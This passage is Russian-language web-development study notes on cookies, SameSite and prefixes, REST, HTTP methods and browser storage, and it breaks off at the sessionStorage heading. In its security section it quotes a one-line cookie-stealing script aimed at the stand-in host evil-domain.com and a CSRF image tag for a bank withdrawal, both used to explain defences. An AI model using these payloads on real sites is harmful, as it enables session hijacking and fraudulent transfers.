Куки отправляются на сервер при любых запросах, даже если запрашивается статический ресурс с чужого сервера, то есть если происходит межсайтовый запрос. Например, если страница сайта site.com содержит изображение сайта site.net, при запросе изображения в запросе будут отправлены все куки пользователя для site.net. Чтобы ограничить отправку кук только тому сайту, которому они принадлежат, используют атрибут SameSite.

C помощью атрибута `SameSite` можно указать, когда и как отправлять куки с межсайтовыми запросами (где сайт определяется комбинацией домена и схемы `http:` или `https:`). В некоторой степени этот атрибут защищает от межсайтовой подделки запроса ([CSRF](https://developer.mozilla.org/ru/docs/Glossary/CSRF)). `SameSite` может принимать три возможных значения: `Strict`, `Lax` и `None`.

С атрибутом `Strict` куки будут отправляться только тому сайту, которому эти куки принадлежат. Атрибут `Lax` работает похоже, но куки будут отправляться также при навигации на тот сайт, которому принадлежат куки. Например, при переходе по ссылке с внешнего сайта. Атрибут `None` отключает ограничение на отправку кук для межсайтовых запросов, но только в безопасном контексте (то есть если установлен `SameSite=None`, тогда также должен быть установлен атрибут `Secure`). Если атрибут `SameSite` не установлен, куки будут восприниматься как `Lax`.

```
Set-Cookie: mykey=myvalue; SameSite=Strict
```

###### Куки с префиксами

Из-за дизайна механизма кук сервер не может подтвердить, что куки были отправлены с защищённого источника (secure origin), или быть уверенным в том, где именно они были установлены.

Уязвимое приложение поддомена может установить куку с атрибутом `Domain`, тем самым открывая к ней доступ на всех других поддоменнах. Этот механизм может эксплуатироваться с атакой _фиксация сессии_.

**Примечание:** Ознакомьтесь со статьёй [фиксация сессии](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#session_fixation), чтобы узнать об основных методах защиты от этой атаки.

Тем не менее в соответствии с принципом [защита в глубину](https://en.wikipedia.org/wiki/Defense_in_depth_\(computing\)) вы можете использовать _куки с префиксами_, чтобы гарантировать специфические факты о куках. Доступны два префикса:

[`__Host-`](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#__host-)

Если в куке содержится этот префикс, она будет установлена заголовком [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie) только в том случае, если кука будет содержать атрибут `Secure` и если запрос будет отправляться из защищённого источника. Также кука не должна включать атрибут `Domain` и должна содержать атрибут `Path` со значением `/`.

[`__Secure-`](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#__secure-)

Если в куке содержится этот префикс, она будет установлена заголовком [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie) только в том случае, если кука будет содержать атрибут `Secure` и если запрос будет отправляться из защищённого источника. Защита с помощью этого префикса слабее по сравнению с префиксом `__Host-`.

Браузеры будут отклонять установку этих кук, если они не будут удовлетворять всем ограничениям. Заметьте, что куки с префиксами, созданные в рамках поддомена, будут ограничиваться только им или будут полностью игнорироваться. Так как бэкенд проверяет только куки с заранее известными именами при авторизации пользователя или валидации CSRF-токена, куки с префиксами фактически работают как защитный механизм от фиксации сессии.

**Примечание:** Бэкенд веб-приложения _обязан_ обращаться по полному имени куки, включая префикс. Пользовательские агенты не удаляют префикс из имени кук перед их отправкой в HTTP-заголовке [`Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Cookie).

Для получения информации о статусе поддержки префиксов в разных браузерах обратитесь к статье про [`Set-Cookie`](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie).

###### Доступ из JavaScript с помощью `Document.cookie`

Куки можно создавать с помощью JavaScript, используя DOM-свойство [`Document.cookie`](https://developer.mozilla.org/ru/docs/Web/API/Document/cookie). Также можно читать куки из JavaScript, если не был установлен атрибут `HttpOnly`.

```js

document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// выведет "yummy_cookie=choco; tasty_cookie=strawberry"

```

Куки, созданные с помощью JavaScript, не могут содержать атрибут `HttpOnly`.

Пожалуйста, учитывайте вытекающие из этого проблемы, про которые рассказывается ниже в разделе [Безопасность](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C). Куки, доступные для JavaScript, могут быть похищены посредством XSS.

###### [Безопасность](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C)

**Примечание:** При сохранении информации в куках имейте в виду, что у всех пользователей есть возможность просматривать и изменять их значения. В зависимости от типа приложения вы можете использовать ни о чём не говорящее имя для идентификатора кук, смысл которого будет понятен только бэкенду. Также вы можете рассмотреть возможность использования альтернативных механизмов аутентификации и конфиденциальности, например, JSON Web Tokens

Способы предотвращения атак, использующих куки:

- Используйте атрибут `HttpOnly` для предотвращения доступа к кукам из JavaScript.
- Куки, которые используются для хранения чувствительной информации, такой как аутентификационный токен, должны иметь короткое время жизни и атрибут `SameSite`, установленный в `Strict` или `Lax`. Для того чтобы узнать больше, смотрите раздел [SameSite](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BA%D1%83%D0%BA%D0%B8_samesite). В [браузерах с поддержкой SameSite](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80%D0%B0%D1%85%20%D1%81%20%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D1%80%D0%B6%D0%BA%D0%BE%D0%B9%20SameSite) это гарантирует предотвращение отправки кук аутентификации с межсайтовыми запросами, фактически такие запросы с точки зрения бэкенда становятся неаутентифицированными.

###### [Захват сессии (session hijacking) и XSS](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B7%D0%B0%D1%85%D0%B2%D0%B0%D1%82_%D1%81%D0%B5%D1%81%D1%81%D0%B8%D0%B8_session_hijacking_%D0%B8_xss)

Куки часто используются в веб-приложениях для идентификации аутентифицированного пользователя и сеанса работы. Соответственно, похищение кук из приложения может привести к захвату авторизованного сеанса пользователя. Кража кук часто осуществляется посредством социальной инженерии (Social Engineering) и использования уязвимости [XSS](https://developer.mozilla.org/ru/docs/Glossary/XSS)

```js

new Image().src =
  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

```

Атрибут HttpOnly помогает уменьшить эту угрозу, перекрывая доступ к кукам из JavaScript.

###### [Межсайтовая подделка запроса (CSRF - Cross-site request forgery)](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%BC%D0%B5%D0%B6%D1%81%D0%B0%D0%B9%D1%82%D0%BE%D0%B2%D0%B0%D1%8F_%D0%BF%D0%BE%D0%B4%D0%B4%D0%B5%D0%BB%D0%BA%D0%B0_%D0%B7%D0%B0%D0%BF%D1%80%D0%BE%D1%81%D0%B0_csrf_-_cross-site_request_forgery)

В [Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery) есть хороший пример [CSRF](https://developer.mozilla.org/ru/docs/Glossary/CSRF). В сообщение, например, в чате или на форуме, включают "изображение", которое, на самом деле, представляет собой запрос к серверу банка на снятие денег:

```html

<img
  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />

```

Если вы аутентифицированны в своём банковском аккаунте, а куки по-прежнему действительны (и никакой дополнительной проверки не требуется), то при загрузке HTML-документа форума или чата с этим изображением деньги будут переведены с вашего счета. Для защиты от этого используется ряд методов:

- Как и при [XSS](https://developer.mozilla.org/ru/docs/Glossary/XSS), важна фильтрация входящей информации.
- Для любой чувствительной операции должно запрашиваться подтверждение.
- Куки, используемые для чувствительных операций, должны иметь короткий срок действия.
- Дополнительную информацию можно получить в пользовательской инструкции по предотвращению [CSRF](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)_Prevention_Cheat_Sheet) на сайте OWASP.

###### [Трекинг и приватность](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%82%D1%80%D0%B5%D0%BA%D0%B8%D0%BD%D0%B3_%D0%B8_%D0%BF%D1%80%D0%B8%D0%B2%D0%B0%D1%82%D0%BD%D0%BE%D1%81%D1%82%D1%8C)

###### [Сторонние (Third-party) куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D1%81%D1%82%D0%BE%D1%80%D0%BE%D0%BD%D0%BD%D0%B8%D0%B5_third-party_%D0%BA%D1%83%D0%BA%D0%B8)

Куки ассоциируются с определённым доменом и схемой (такой как `http:` или `https:`). Также они могут быть ассоциированы с поддоменом с помощью атрибута `Domain`. Если домен и схема кук совпадает с доменом и схемой текущей страницы, на которой вы находитесь, то их называют _собственными куками_ (_first-party cookies_). Если домен и схема кук отличается от домена и схемы текущей страницы, то такие куки называют _сторонними куками_ (_third-party cookies_).

Сервер, хостящий страницу, устанавливает собственные куки, но на странице могут находиться изображения и другие компоненты с других доменов (например, баннерная реклама), они в свою очередь могут устанавливать сторонние куки. Сторонние куки часто используются для рекламы и трекинга пользователей в сети. Как пример, можете посмотреть куки, которые [устанавливает Google](https://policies.google.com/technologies/cookies#types-of-cookies).

Третья сторона, контролирующая внедрение сторонних кук, может создать профиль пользователя на основе истории его посещений разных сайтов с помощью кук, отправляемых одним и тем же браузером с разных сайтов. Firefox по умолчанию блокирует сторонние куки, про которые известно, что они используются для трекинга пользователей. Сторонние куки (или просто куки для трекинга) могут также быть заблокированы другими настройками браузера или расширениями. Блокировка кук в некоторых ситуациях может стать причиной некорректного поведения сторонних компонентов, например, виджетов социальных сетей.

**Примечание:** Бэкенд может (и должен) устанавливать у кук [атрибут SameSite](https://developer.mozilla.org/ru/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) для управления отправкой кук на сторонние серверы.

###### [Законодательство, связанное с куки](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B7%D0%B0%D0%BA%D0%BE%D0%BD%D0%BE%D0%B4%D0%B0%D1%82%D0%B5%D0%BB%D1%8C%D1%81%D1%82%D0%B2%D0%BE_%D1%81%D0%B2%D1%8F%D0%B7%D0%B0%D0%BD%D0%BD%D0%BE%D0%B5_%D1%81_%D0%BA%D1%83%D0%BA%D0%B8)

Регулирующие акты и законодательство, покрывающие куки, включают:

- General Data Privacy Regulation (GDPR) в Европейском Союзе
- ePrivacy Directive в Европейском Союзе
- California Consumer Privacy Act в Штате Калифорния

Эти акты и директивы действуют глобально. Они применяются ко всем сайтам во Всемирной паутине, к которым пользователи из данных юрисдикций получают доступ (Европейский Союз и Калифорния, с оговоркой, что Калифорнийский закон применяется к компаниям с доходом выше 25 миллионов долларов и несколькими другими оговорками).

Эти акты и директивы включают такие требования как:

- Сообщать пользователям, что сайт использует куки.
- Давать возможность пользователям отказываться от получения всех или некоторых кук.
- Давать возможность пользователям использовать основные функции вашего сервиса без получения кук.

Могут существовать другие законодательные акты, которые применимы к вашей локальной юрисдикции. На вас лежит ответственность знать про них и следовать им. Существуют компании, которые предлагают код с "куки баннером" и берут на себя заботы о следовании законодательству, связанному с куками.

###### [Другие способы хранения информации в браузере](https://developer.mozilla.org/ru/docs/Web/HTTP/Guides/Cookies#%D0%B4%D1%80%D1%83%D0%B3%D0%B8%D0%B5_%D1%81%D0%BF%D0%BE%D1%81%D0%BE%D0%B1%D1%8B_%D1%85%D1%80%D0%B0%D0%BD%D0%B5%D0%BD%D0%B8%D1%8F_%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%86%D0%B8%D0%B8_%D0%B2_%D0%B1%D1%80%D0%B0%D1%83%D0%B7%D0%B5%D1%80%D0%B5)

Другой способ для хранения данных в браузере — [Web Storage API](https://developer.mozilla.org/ru/docs/Web/API/Web_Storage_API/Using_the_Web_Storage_API). Свойства [window.sessionStorage](https://developer.mozilla.org/ru/docs/Web/API/Window/sessionStorage) и [window.localStorage](https://developer.mozilla.org/ru/docs/Web/API/Window/localStorage) подобны сессионным и постоянным кукам, но позволяют хранить больше данных и никогда не отправляются на сервер. Для хранения ещё большего объёма структурированных данных может использоваться [IndexedDB API](https://developer.mozilla.org/ru/docs/Web/API/IndexedDB_API) или библиотеки, построенные поверх него.

Существуют техники для повторной установки кук после их удаления. Такие куки называются куки-зомби. Эти техники нарушают принципы приватности пользователей и пользовательского контроля и могут нарушать законодательства, регулирующие приватность данных, соответственно, использующий их сайт подвержен судебному разбирательству.
##### Простые HTTP-запросы
Простые HTTP-запросы - это ==запросы, которые соответствуют определенным условиям и могут быть выполнены без дополнительных проверок безопасности со стороны браузера==. Они включают в себя использование определенных HTTP-методов и заголовков. 

Основные характеристики простых HTTP-запросов:

- **Методы:** GET, POST, HEAD. 
- **Заголовки:** Accept, Accept-Language, Content-Language, Content-Type (с определенными значениями: application/x-www-form-urlencoded, multipart/form-data, text/plain). 
- **Тело запроса:** Для GET и HEAD запросов тело не используется, для POST запросов может содержать данные в указанных выше форматах. 
- **События на объекте XMLHttpRequestUpload:** Не должны быть зарегистрированы обработчики событий на upload-объекте. 
- **Объект ReadableStream:** Не должен использоваться в запросе. 

В чем отличие простого запроса от сложного?

- **Простые запросы**
    
    не требуют сложных проверок безопасности при выполнении, так как они соответствуют определенным, четко заданным критериям. Это позволяет браузерам более эффективно обрабатывать такие запросы, избегая дополнительных проверок на наличие CORS-ошибок или других проблем безопасности.
    
- **Сложные запросы**,
    
    не удовлетворяющие указанным выше требованиям, могут потребовать дополнительных проверок со стороны браузера на безопасность, что может повлиять на производительность и надежность взаимодействия с сервером. Примером может служить использование других HTTP-методов или установка заголовков, не относящихся к списку допустимых для простых запросов. 
    

Примеры простых HTTP-запросов:

- Получение данных с сервера с помощью метода GET:

Код

```
    GET /resource HTTP/1.1    Host: example.com    Accept: application/json
```

- Отправка данных на сервер для создания нового ресурса с помощью метода POST:

Код

```
    POST /resource HTTP/1.1    Host: example.com    Content-Type: application/x-www-form-urlencoded    Content-Length: 20    param1=value1&param2=value2
```

- Запрос заголовков ресурса с помощью метода HEAD:

Код

```
    HEAD /resource HTTP/1.1    Host: example.com
```



##### REST
https://developer.mozilla.org/en-US/docs/Glossary/REST
https://habr.com/ru/articles/38730/
https://habr.com/ru/articles/590679/
https://www.codecademy.com/article/what-is-rest
https://ru.wikipedia.org/wiki/REST

**REST API** — это архитектурный подход, который устанавливает ограничения для API: как они должны быть устроены и какие функции поддерживать. Это позволяет стандартизировать работу программных интерфейсов, сделать их более удобными и производительными.

Слово REST — акроним от Representational State Transfer, что переводится на русский как «передача состояния представления», «передача репрезентативного состояния» или «передача „самоописываемого“ состояния».

В отличие от, например, SOAP API, REST API — не протокол, а простой список рекомендаций, которым можно следовать или не следовать. Поэтому у него нет собственных методов. С другой стороны, его автор Рой Филдинг создал ещё и [протокол HTTP](https://skillbox.ru/media/code/chto-takoe-http-i-zachem-on-nuzhen/?utm_source=media&utm_medium=link&utm_campaign=all_all_media_links_links_articles_all_all_skillbox), так что они очень хорошо сочетаются, и REST обычно используют в связке с HTTP. Хотя новичкам нужно помнить: **REST — это не только HTTP, а HTTP — не только REST**.

Всего в REST есть шесть требований к проектированию API. Пять из них обязательные, одно — опциональное:

- Клиент-серверная модель (client-server model).
- Отсутствие состояния (statelessness).
- Кэширование (cacheability).
- Единообразие интерфейса (uniform interface).
- Многоуровневая система (layered system).
- Код по требованию (code on demand) — необязательно.

###### Клиент-серверная модель (client-server model).
Первым ограничением, применимым к гибридной модели, является приведение архитектуры к модели клиент-сервер. Разграничение потребностей является принципом, лежащим в основе данного накладываемого ограничения. Отделение потребности интерфейса [клиента](https://ru.wikipedia.org/wiki/%D0%9A%D0%BB%D0%B8%D0%B5%D0%BD%D1%82_\(%D0%B8%D0%BD%D1%84%D0%BE%D1%80%D0%BC%D0%B0%D1%82%D0%B8%D0%BA%D0%B0\) "Клиент (информатика)") от потребностей [сервера, хранящего данные](https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_\(%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5\) "Сервер (приложение)"), повышает переносимость [кода](https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D1%8B%D0%B9_%D0%BA%D0%BE%D0%B4 "Программный код") клиентского [интерфейса](https://ru.wikipedia.org/wiki/%D0%98%D0%BD%D1%82%D0%B5%D1%80%D1%84%D0%B5%D0%B9%D1%81 "Интерфейс") на другие платформы, а упрощение [серверной части](https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_\(%D0%BF%D1%80%D0%B8%D0%BB%D0%BE%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5\) "Сервер (приложение)") улучшает масштабируемость. Наибольшее же влияние на [всемирную паутину](https://ru.wikipedia.org/wiki/%D0%92%D1%81%D0%B5%D0%BC%D0%B8%D1%80%D0%BD%D0%B0%D1%8F_%D0%BF%D0%B0%D1%83%D1%82%D0%B8%D0%BD%D0%B0 "Всемирная паутина"), пожалуй, имеет само разграничение, которое позволяет отдельным частям развиваться независимо друг от друга, поддерживая потребности в развитии интернета со стороны различных организаций.

**Сервер** — программа, в которой хранятся и обрабатываются ресурсы. Сервер может располагаться на одном или нескольких компьютерах; но даже в одном компьютере может быть несколько виртуальных серверов. Допустим, изначально HTML-код этой статьи хранился где-то на серверах Skillbox.

**Клиент** — программа, которая запрашивает у сервера доступ к ресурсам. Для этого она использует API. Когда ваш браузер запрашивает у сервера Skillbox эту веб-страницу, он выступает в роли клиента.
Второй принцип настолько важен, что даже отражён в названии архитектурного стиля — **Representational State Transfer**. Это значит, что на сервере не хранится никаких данных о прошлых взаимодействиях с клиентом — каждый запрос должен содержать всю информацию для его обработки.
Если клиент потом хочет получить предпоследнее сообщение, то он не может просто сказать: «Дай мне соседний ресурс» — ему нужно заново составить полный запрос по всем правилам.

Это снижает нагрузку на сервер, что особенно полезно, если к нему подключено одновременно много клиентов. Не нужно хранить дополнительную информацию о прошлых обращениях каждого из них. Достаточно обработать каждый запрос в отдельности.

Даже если какой-то из предыдущих запросов потеряется, это не сломает логику взаимодействия клиента и сервера, потому что каждый запрос самодостаточен.

###### Отсутствие состояния (statelessness).
Протокол взаимодействия между клиентом и сервером требует соблюдения следующего условия: в период между запросами клиента никакая информация о _состоянии_ _клиента_ на сервере не хранится ([Stateless protocol](https://ru.wikipedia.org/wiki/%D0%9F%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB_%D0%B1%D0%B5%D0%B7_%D1%81%D0%BE%D1%85%D1%80%D0%B0%D0%BD%D0%B5%D0%BD%D0%B8%D1%8F_%D1%81%D0%BE%D1%81%D1%82%D0%BE%D1%8F%D0%BD%D0%B8%D1%8F "Протокол без сохранения состояния") или «протокол без сохранения состояния»). Все запросы от клиента должны быть составлены так, чтобы сервер получил всю необходимую информацию для выполнения запроса. _Состояние_ _сессии_ при этом сохраняется на стороне клиента[[3]](https://ru.wikipedia.org/wiki/REST#cite_note-Fielding-Ch5-3). Информация о состоянии сессии может быть передана сервером какому-либо другому сервису (например, в службу базы данных) для поддержания устойчивого состояния, например, на период установления аутентификации. Клиент инициирует отправку запросов, когда он готов (возникает необходимость) перейти в новое состояние.

Во время обработки клиентских запросов считается, что клиент находится в _переходном состоянии_. Каждое отдельное _состояние_ _приложения_ представлено связями, которые могут быть задействованы при следующем обращении клиента.

###### Кэширование (cacheability).

Иногда клиент запрашивает с сервера одни и те же данные по несколько раз — например, вы постоянно обращаетесь к какому-нибудь важному письму в сервисе для учёта деловых переписок.

Если при каждом таком запросе сервер будет с нуля собирать нужные данные и отправлять их клиенту, нагрузка на систему повысится — особенно когда таких повторов много. Решением проблемы в REST API стало **кэширование**, то есть сохранение части данных у клиента или на промежуточных серверах.

###### **Единообразие интерфейса**

Должен быть **единый способ обращения** к каждому ресурсу. Например, мы хотим добавить в наш сервис новую функциональность для просмотра данных о денежных переводах. Понятно, что логика интерфейса для обращения к ним должна быть такой же, как и для всего, что было в сервисе раньше.

Наличие унифицированного интерфейса является фундаментальным требованием дизайна REST-сервисов[[3]](https://ru.wikipedia.org/wiki/REST#cite_note-Fielding-Ch5-3). Унифицированные интерфейсы позволяют каждому из сервисов развиваться независимо.

К унифицированным интерфейсам предъявляются следующие четыре ограничительных условия[[10]](https://ru.wikipedia.org/wiki/REST#cite_note-_a0e7ce7946f0bdab-10)[[11]](https://ru.wikipedia.org/wiki/REST#cite_note-11):

**Идентификация ресурсов**  
Все ресурсы идентифицируются в запросах, например, с использованием [URI](https://ru.wikipedia.org/wiki/URI "URI") в интернет-системах. Ресурсы концептуально отделены от представлений, которые возвращаются клиентам. Например, [сервер](https://ru.wikipedia.org/wiki/%D0%A1%D0%B5%D1%80%D0%B2%D0%B5%D1%80_\(%D0%BF%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%BC%D0%BD%D0%BE%D0%B5_%D0%BE%D0%B1%D0%B5%D1%81%D0%BF%D0%B5%D1%87%D0%B5%D0%BD%D0%B8%D0%B5\) "Сервер (программное обеспечение)") может отсылать данные из [базы данных](https://ru.wikipedia.org/wiki/%D0%91%D0%B0%D0%B7%D0%B0_%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85 "База данных") в виде [HTML](https://ru.wikipedia.org/wiki/HTML "HTML"), [XML](https://ru.wikipedia.org/wiki/XML "XML") или [JSON](https://ru.wikipedia.org/wiki/JSON "JSON"), ни один из которых не является типом хранения внутри сервера.

**Манипуляция ресурсами через представление**  
Если клиент хранит представление ресурса, включая метаданные — он обладает достаточной информацией для модификации или удаления ресурса.

**«Самоописываемые» сообщения**  
Каждое сообщение содержит достаточно информации, чтобы понять, каким образом его обрабатывать. К примеру, обработчик сообщения (parser), необходимый для извлечения данных, может быть указан в [списке MIME-типов](https://ru.wikipedia.org/wiki/%D0%A1%D0%BF%D0%B8%D1%81%D0%BE%D0%BA_MIME-%D1%82%D0%B8%D0%BF%D0%BE%D0%B2 "Список MIME-типов")[[3]](https://ru.wikipedia.org/wiki/REST#cite_note-Fielding-Ch5-3).

**Гипермедиа как средство изменения состояния приложения ([HATEOAS](https://ru.wikipedia.org/wiki/HATEOAS "HATEOAS"))**  
Клиенты изменяют состояние системы только через действия, которые динамически определены в гипермедиа на сервере (к примеру, [гиперссылки](https://ru.wikipedia.org/wiki/%D0%93%D0%B8%D0%BF%D0%B5%D1%80%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B0 "Гиперссылка") в [гипертексте](https://ru.wikipedia.org/wiki/%D0%93%D0%B8%D0%BF%D0%B5%D1%80%D1%82%D0%B5%D0%BA%D1%81%D1%82 "Гипертекст")). Исключая простые точки входа в приложение, клиент не может предположить, что доступна какая-то операция над каким-то ресурсом, если не получил информацию об этом в предыдущих запросах к серверу. Не существует универсального формата для предоставления ссылок между ресурсами, Web Linking ([RFC 5988](https://datatracker.ietf.org/doc/html/rfc5988) -> [RFC 8288](https://datatracker.ietf.org/doc/html/rfc8288)) и [JSON Hypermedia API Language](https://tools.ietf.org/id/draft-kelly-json-hal-03.txt) [Архивная копия](https://web.archive.org/web/20140627002807/https://tools.ietf.org/id/draft-kelly-json-hal-03.txt) от 27 июня 2014 на [Wayback Machine](https://ru.wikipedia.org/wiki/Wayback_Machine "Wayback Machine") являются двумя популярными форматами предоставления ссылок в REST HYPERMEDIA сервисах.

###### **Многоуровневая система**

До сих пор мы рассматривали сервер как единую сущность. Но его структура куда сложнее. Между ним и клиентом есть несколько промежуточных узлов, выполняющих вспомогательные функции, — **прокси-серверы**.

Они используются для кэширования, обеспечения безопасности, дополнительной обработки данных. Если основных серверов несколько, то дополнительные серверы-балансировщики могут распределять нагрузку между ними и решать, в какой из них направлять запрос:

![](https://skillbox.ru/upload/setka_images/09194607122022_bd473197c461193ea9b6d317f4c236910d065887.png)

_Изображение: Майя Мальгина для Skillbox Media_

Никто из участников цепочки не знает всего пути, который проходит запрос, — только своих «соседей» справа и слева. Ни клиент, ни один из прокси-серверов не знает, к кому он обращается — к основному сервису или к другому прокси. В REST API это работает в обе стороны: никакие серверы (ни основные, ни прокси) не знают, кому отправляют ответ и уходит ли он куда-то дальше.

###### **Код по требованию (необязательно)**

Этот принцип означает, что сервер в ответ на запрос может **отправить исходный код**, который выполняется уже на стороне клиента. Благодаря этому можно передавать целые сценарии. Например, динамические элементы пользовательского интерфейса, написанные на JavaScript.

В REST API требование необязательно, потому что не всем сайтам и сервисам нужно умение работать с готовыми скриптами.


##### graph QL

https://graphql.org/
https://habr.com/ru/articles/765064/
https://gitconnected.com/learn/graphql

##### GET/POST/PUT/DELETE?PATCH

Вот объяснение основных HTTP-методов (**GET, POST, PUT, DELETE, PATCH**) с примерами и сравнением:

---

###### **1. GET (Чтение данных)**
**Для чего:** Запрос данных с сервера (без изменений).  
**Характеристики:**
- Безопасный (не меняет состояние сервера)
- Идемпотентный (повторные запросы дают тот же результат)
- Данные передаются в URL (ограничение длины)
- Кэшируется браузером

**Пример:**  
```http
GET /api/users/123 HTTP/1.1
```
**Ответ:** Данные пользователя с ID 123.

---

###### **2. POST (Создание данных)**
**Для чего:** Отправка данных на сервер (создание нового ресурса).  
**Характеристики:**
- Небезопасный (меняет состояние сервера)
- Неидемпотентный (повторный запрос создаст дубликат)
- Данные передаются в теле запроса (нет ограничения длины)
- Не кэшируется

**Пример:**  
```http
POST /api/users HTTP/1.1
Content-Type: application/json

{"name": "John", "age": 30}
```
**Ответ:** Созданный пользователь с ID 456.

---

###### **3. PUT (Полное обновление)**
**Для чего:** Замена всего ресурса новыми данными.  
**Характеристики:**
- Небезопасный
- Идемпотентный (повторный запрос не изменит результат)
- Требует отправки всех полей ресурса

**Пример:**  
```http
PUT /api/users/123 HTTP/1.1
Content-Type: application/json

{"name": "John Updated", "age": 35}
```
**Ответ:** Обновленные данные пользователя (все поля перезаписаны).

---

###### **4. DELETE (Удаление)**
**Для чего:** Удаление ресурса.  
**Характеристики:**
- Небезопасный
- Идемпотентный (повторные запросы не изменят результат после первого удаления)

**Пример:**  
```http
DELETE /api/users/123 HTTP/1.1
```
**Ответ:** Код 204 (No Content) при успехе.

---

###### **5. PATCH (Частичное обновление)**
**Для чего:** Изменение отдельных полей ресурса.  
**Характеристики:**
- Небезопасный
- Неидемпотентный (зависит от реализации)
- Отправляются только изменяемые поля

**Пример:**  
```http
PATCH /api/users/123 HTTP/1.1
Content-Type: application/json

{"age": 40}
```
**Ответ:** Обновленный ресурс (только поле `age` изменено).

---

###### **Сравнение методов**
| Метод   | Идемпотентность | Безопасность | Тело запроса | Использование           |
|---------|-----------------|--------------|--------------|-------------------------|
| GET     | Да              | Да           | Нет          | Получение данных        |
| POST    | Нет             | Нет          | Да           | Создание ресурса        |
| PUT     | Да              | Нет          | Да           | Полная замена ресурса   |
| DELETE  | Да              | Нет          | Нет/Да       | Удаление ресурса        |
| PATCH   | Нет*            | Нет          | Да           | Частичное обновление    |

> *PATCH может быть идемпотентным, если изменения предсказуемы (например, установка значения `age=40`).

---

###### **Когда что использовать?**
- **GET:** Для получения данных (списка пользователей, деталей товара).  
- **POST:** Для создания (новый пользователь, отправка формы).  
- **PUT:** Для полного обновления (замена профиля пользователя).  
- **PATCH:** Для изменения одного поля (например, смена email).  
- **DELETE:** Для удаления (удаление пользователя).

---

###### **Примеры REST API**
```http
GET    /api/books       — список всех книг
POST   /api/books       — добавить новую книгу
GET    /api/books/42    — получить книгу с ID 42
PUT    /api/books/42    — полностью обновить книгу 42
PATCH  /api/books/42    — изменить автора книги 42
DELETE /api/books/42    — удалить книгу 42
```

**Важно:**  
- Для PATCH используйте формат JSON Patch (`Content-Type: application/json-patch+json`), если API поддерживает.  
- PUT и PATCH часто путают: PUT = перезапись всего, PATCH = точечное изменение.

##### Объясните разницу между `cookie`, `sessionStorage` и `localStorage`.[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D0%BE%D0%B1%D1%8A%D1%8F%D1%81%D0%BD%D0%B8%D1%82%D0%B5-%D1%80%D0%B0%D0%B7%D0%BD%D0%B8%D1%86%D1%83-%D0%BC%D0%B5%D0%B6%D0%B4%D1%83-cookie-sessionstorage-%D0%B8-localstorage "Прямая ссылка на объясните-разницу-между-cookie-sessionstorage-и-localstorage")

###### Ссылки[​](https://www.frontendinterviewhandbook.com/ru/html-questions#%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B8-5 "Прямая ссылка на Ссылки")

- [https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [http://tutorial.techaltum.com/local-and-session-storage.html](http://tutorial.techaltum.com/local-and-session-storage.html)

Вот сравнение **cookie**, **sessionStorage** и **localStorage** — трех основных способов хранения данных в браузере:

---

###### **1. Куки (Cookie)**  
**Хранение:**  
- Сохраняются **на клиенте и сервере** (передаются с каждым HTTP-запросом в заголовках).  
- Объем: **~4 КБ** на домен.  

**Срок жизни:**  
- Задается вручную (например, `expires=Mon, 01-Jan-2024 12:00:00 GMT`).  
- Могут быть **сессионными** (удаляются при закрытии браузера).  

**Доступ:**  
- Через `document.cookie` (строку в формате `key=value`).  
- Сервер может читать/устанавливать куки (заголовки `Set-Cookie` и `Cookie`).  

**Пример:**  
```javascript
// Установка
document.cookie = "username=John; expires=Thu, 18 Dec 2025 12:00:00 UTC; path=/";

// Чтение
console.log(document.cookie); // "username=John; theme=dark"
```

**Когда использовать:**  
- Для аутентификации (токены).  
- Персонализация (темы, языковые настройки).  

---

###### **2. sessionStorage**  
